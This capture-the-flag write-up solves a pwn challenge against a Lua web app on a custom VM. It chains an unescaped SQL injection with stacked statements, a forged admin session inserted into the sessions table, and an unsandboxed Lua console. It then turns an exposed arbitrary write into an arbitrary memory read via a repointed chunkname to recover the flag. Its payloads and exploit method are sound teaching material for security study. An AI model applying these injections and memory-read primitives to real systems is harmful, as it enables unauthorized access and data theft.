# PwnSec Support — Pwn (Hard, 23 solves)

**Flag:** `pwnsec{ba421abd9f5d861d}`

A Lua 5.5 web app running as a guest image on **`l3afvm`**, a custom 32-bit ISA emulator with
128 MiB of guest RAM. Four stages: SQLi → forged admin session → unsandboxed Lua → an
arbitrary write turned into an arbitrary read.

## Stage 0 — the guest image hands you the source
`ctf_sql.l3af` is NDJSON: one instruction or datum per line
(`["LC", 0, ".L..5663"]`, `["DATA_BYTES", name, hex]`, `":label"`). Don't disassemble the
custom ISA — the whole Lua app is sitting in the data section. Every
`["DATA_BYTES", "embedded_lua_module_N", hex]` line is a module:

```
web/app.lua  sql/{engine,parser,storage,init,types}.lua  http/http.lua  tcp/{tcp,server}.lua
```

## Stage 1 — unescaped numeric SQLi, with stacked statements
`web/app.lua` escapes `/login` with `sql_param()` but interpolates `/ticket?id=` raw:

```lua
"SELECT t.id, … FROM tickets t, users u WHERE t.reporter_id = u.id AND t.id = " .. id
```

and `sql.query` does `parser.parse(sql)` returning **statements** (plural) — the tokenizer
defines `TOK_SEMICOLON`. So statements stack. Confirmed with a boolean pair:
`id=0 OR 1=1` → ticket #1, `id=1 AND 1=2` → not found.

## Stage 2 — forge an admin session
`/admin` is gated by:

```lua
SELECT u.id, u.username FROM sessions s, users u
WHERE s.token = '<token>' AND s.user_id = u.id AND u.is_admin = 1
```

`token` is also unescaped, but a quote-break is useless: `sessions` starts empty and the
`FROM` is a cross join, so zero rows no matter what the predicate says. Create the row
instead — user 1 is `root` with `is_admin = 1`:

```
/ticket?id=1; INSERT INTO sessions (token,user_id,expires_at,ip_address)
              VALUES ('pwnpwn',1,'2099-01-01 00:00:00','1.1.1.1')
```

`/admin?token=pwnpwn` → *"Signed in as root (admin)"*.

## Stage 3 — the console is not sandboxed
```lua
local function run_lua(code)
    local f, load_err = load(code)   -- that is the whole sandbox
```
Full `io`, `os`, `debug`, `package`. `debug.getupvalue(package.loaded["web.app"].start, 1)`
reaches the module-private `db` upvalue and dumps every table — but **`flags` is empty**, both
in the handout and live. And the VM has no host resources: `io.open` → `"System Error"`,
`os.getenv("FLAG")` → `nil`.

The flag is instead two data symbols at the very end of the image:

```
["DATA", "FLAGPAD", 3936068]     <- megabytes of random bytes
["DATA", "FLAG",    …]
```

**No instruction anywhere references either symbol** — it is a static blob hidden in noise, so
it has to be read out of guest memory.

## Stage 4 — arbitrary write
`embedded_note_save` takes two integers and does:

```
r0 = (134217728 > addr)     ; GT dst,a,b computes (b > a)
r0 = 1 XOR r0              ; r0 = (addr >= 128 MiB)
JZ r0, else                ; addr < 128 MiB -> skip the error
  luaL_error("note address out of range")
else:
  SW value, addr           ; *(u32*)addr = value
```

The guard is *correct*; the bug is that an arbitrary 4-byte guest write is exposed to scripting
at all. Worth noting because the disassembly reads as inverted at first glance — one
`note_save(100, 65)` call (which succeeds) settles the operand order.

`tostring({})` also leaks guest addresses, and `l3afvm --trace` prints the map:

```
[LOAD] data=0x00010000..0x003f9d04 code=0x003f9d10..0x006b2fd0 (178476 instructions)
```

## Stage 5 — turning the write into a read
Rejected: `tcp_recv(h,len)` clamps `len` to 4096 and pushes only the bytes actually received
from a fixed buffer; `tcp_send` takes a Lua string, not a pointer; `rand_hex`/`rng`/`ticks`
generate rather than read. Lua-internals routes (forging a TValue, patching `UpVal->v`) all
need Lua 5.5's reworked table/string layout.

Much cleaner: `embedded_lua_modules` is a static DATA array of
`{name, chunkname, source, len}` and the loader calls `luaL_loadbufferx(L, src, len, chunkname, …)`.
Point one entry's **chunkname** at the target and give it a source that fails to compile;
Lua's error quotes the chunk name:

```
[string "<bytes at the target, read as a C string>"]:N:  near 'Lua'
```

That is an arbitrary read which never writes to the target. The 17-byte string
`"unknown Lua error"` at the data base doubles as the source that won't compile. Verified
against known content: `0x10000` → `unknown Lua error`, and `0x38DA8` → FLAGPAD's exact first
bytes from the handout image.

## Stage 6 — finding FLAG, which moves
Locally `FLAG` is the last object, so `data_end − 24 = 0x3F9CEC`. On the live instance that
address reads `[string ""]` — a NUL. Everything below FLAGPAD is identical across builds (so
the pad always starts at `0x38DA8`), but **the pad's size is part of the challenge**, so FLAG
moves.

Dense random pad makes the C-string read return ~40+ bytes (Lua truncates at `LUA_IDSIZE`),
while the pointer table above the pad returns 1–3 bytes, so `len >= 20` is a "still inside the
pad" oracle. It is noisy — random bytes hold a NUL within 20 bytes ~7.5% of the time, which is
exactly what made a single-sample search converge on a false boundary locally — so each probe
samples three nearby addresses and takes the max. Binary-search the transition, then walk
forward:

```
[*] pad ends near 0x3f2bd0
[+] 0x3f2bb4 -> b"…\x19pwnsec{ba421abd9f5d861d}\x14"
FLAG: pwnsec{ba421abd9f5d861d}
```

80 reads locally, ~50 on the live instance.

## Operational notes
* The edge proxy in front of the live instance **rejects `requests`' POSTs**
  (`RemoteDisconnected`) while `curl`'s identical POSTs succeed — the exploit shells out to curl.
* Solving the challenge tears the instance down immediately (root becomes 404), so re-verify
  against the local `./l3afvm ./ctf_sql.l3af`.

## Lesson
When a VM image ships as a text listing, extract the embedded high-level source before
touching the custom ISA — the entire Lua app came out of `DATA_BYTES` and handed over two
unescaped injections. And prefer a read primitive built from the target's *own* error
reporting: repointing a `chunkname` reads memory through `luaL_loadbufferx` with no knowledge
of Lua's internal object layout, and unlike a TValue forge it cannot corrupt what it reads.
